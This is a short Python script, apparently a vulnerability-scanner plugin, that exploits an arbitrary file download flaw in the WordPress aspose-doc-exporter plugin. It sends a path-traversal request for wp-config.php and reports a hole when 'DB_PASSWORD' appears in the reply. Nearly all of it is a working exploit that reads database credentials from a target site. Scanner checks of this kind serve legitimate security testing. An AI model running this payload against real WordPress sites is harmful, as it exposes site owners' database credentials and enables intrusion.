#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'lkz'
# refer:http://cxsecurity.com/issue/WLB-2015030204
# Exploit Title: Wordpress aspose-doc-exporter Plugin Arbitrary File
# Download Vulnerability
import re


def assign(service, arg):
    if service == "wordpress":
        return True, arg


def audit(arg):
    payload = "wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php"
    verify_url = arg + payload
    code, head, res, errcode, _ = curl.curl(verify_url)
    if code == 200 and 'DB_PASSWORD' in res:
        security_hole(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])